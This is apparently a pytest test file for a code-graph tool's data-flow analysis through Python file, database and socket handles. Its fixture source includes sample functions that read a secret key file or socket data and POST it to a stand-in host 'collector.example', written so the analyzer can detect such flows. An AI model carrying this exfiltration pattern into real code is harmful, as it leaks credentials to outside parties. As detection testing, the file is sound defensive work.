# Issue #2751: Python I/O through a resource handle starts and ends flows.
# `with open(p) as f: data = f.read()`, `f.write(token)` and
# `conn.execute(...).fetchall()` got READS_FROM / WRITES_TO edges from the I/O
# walk, but the flow walk had no handle model, so no FLOWS_TO joined them.
from __future__ import annotations

from unittest.mock import MagicMock

import pytest

from codebase_rag import constants as cs
from codebase_rag.capture import resolve_capture
from codebase_rag.graph_updater import GraphUpdater
from codebase_rag.parser_loader import load_parsers

_CAPTURE_IO = resolve_capture([cs.CaptureGroup.IO.value])
FLOWS_TO = cs.RelationshipType.FLOWS_TO.value
STDOUT = "resource::STDOUT::<dynamic>"

APP = """import os
import socket
import sqlite3

import requests


def upload_secret():
    with open("/etc/app/secret.pem") as f:
        data = f.read()
    requests.post("https://collector.example/upload", data=data)


def save_token():
    token = os.getenv("API_TOKEN")
    with open("/tmp/token.txt", "w") as f:
        f.write(token)


def dump_users():
    conn = sqlite3.connect("/var/app.db")
    rows = conn.execute("SELECT email FROM users").fetchall()
    print(rows)


def without_with():
    f = open("/etc/plain.txt")
    data = f.read()
    print(data)


def inline_read():
    data = open("/etc/inline.txt").read()
    print(data)


def via_cursor():
    conn = sqlite3.connect("/var/cur.db")
    cur = conn.cursor()
    cur.execute("SELECT name FROM t")
    rows = cur.fetchall()
    print(rows)


def from_socket():
    s = socket.socket()
    msg = s.recv(1024)
    requests.post("https://collector.example/sock", data=msg)


class Saver:
    def __init__(self):
        self.out = open("/tmp/self.txt", "w")

    def save(self):
        self.out.write(os.getenv("SELF_TOKEN"))


def show_token():
    token = os.getenv("SHOW_TOKEN")
    print(token)


def unused_read():
    with open("/etc/unused.txt") as f:
        data = f.read()
    return len("x")


def clean_write():
    with open("/tmp/clean.txt", "w") as f:
        f.write("constant")


def not_a_handle(buf):
    data = buf.read()
    print(data)


def rebound(make):
    f = open("/etc/rebound.txt")
    f = make()
    data = f.read()
    print(data)


def write_verb():
    conn = sqlite3.connect("/var/w.db")
    res = conn.execute("DELETE FROM t")
    print(res)
"""


@pytest.fixture(scope="module")
def flows(tmp_path_factory: pytest.TempPathFactory) -> set[tuple[str, str]]:
    root = tmp_path_factory.mktemp("pyhandles")
    (root / "app.py").write_text(APP, encoding="utf-8")
    parsers, queries = load_parsers()
    mock = MagicMock()
    GraphUpdater(
        ingestor=mock,
        repo_path=root,
        parsers=parsers,
        queries=queries,
        capture=_CAPTURE_IO,
    ).run()
    return {
        (str(c.args[0][2]), str(c.args[2][2]))
        for c in mock.ensure_relationship_batch.call_args_list
        if str(c.args[1]) == FLOWS_TO
    }


@pytest.mark.parametrize(
    ("source", "sink"),
    [
        (
            "resource::FILE::/etc/app/secret.pem",
            "resource::NETWORK::https://collector.example/upload",
        ),
        ("resource::ENV::API_TOKEN", "resource::FILE::/tmp/token.txt"),
        ("resource::DATABASE::/var/app.db", STDOUT),
        ("resource::FILE::/etc/plain.txt", STDOUT),
        ("resource::FILE::/etc/inline.txt", STDOUT),
        ("resource::DATABASE::/var/cur.db", STDOUT),
        (
            "resource::SOCKET::<dynamic>",
            "resource::NETWORK::https://collector.example/sock",
        ),
        ("resource::ENV::SELF_TOKEN", "resource::FILE::/tmp/self.txt"),
    ],
)
def test_a_handle_read_or_write_is_a_flow_end(
    flows: set[tuple[str, str]], source: str, sink: str
) -> None:
    assert (source, sink) in flows


# Negative: what must not change.


def test_a_direct_registry_flow_still_flows(flows: set[tuple[str, str]]) -> None:
    assert ("resource::ENV::SHOW_TOKEN", STDOUT) in flows


@pytest.mark.parametrize(
    "resource",
    [
        "resource::FILE::/etc/unused.txt",
        "resource::FILE::/etc/rebound.txt",
        "resource::DATABASE::/var/w.db",
    ],
)
def test_a_handle_value_that_reaches_no_sink_starts_no_flow(
    flows: set[tuple[str, str]], resource: str
) -> None:
    assert not [pair for pair in flows if pair[0] == resource]


def test_a_clean_write_through_a_handle_ends_no_flow(
    flows: set[tuple[str, str]],
) -> None:
    assert not [pair for pair in flows if pair[1] == "resource::FILE::/tmp/clean.txt"]


def test_a_read_on_a_value_that_is_not_a_handle_is_no_source(
    flows: set[tuple[str, str]],
) -> None:
    sources = {source for source, _sink in flows}

    assert sources <= {
        "resource::FILE::/etc/app/secret.pem",
        "resource::ENV::API_TOKEN",
        "resource::DATABASE::/var/app.db",
        "resource::FILE::/etc/plain.txt",
        "resource::FILE::/etc/inline.txt",
        "resource::DATABASE::/var/cur.db",
        "resource::SOCKET::<dynamic>",
        "resource::ENV::SELF_TOKEN",
        "resource::ENV::SHOW_TOKEN",
    } | {source for source, _sink in flows if not source.startswith("resource::")}
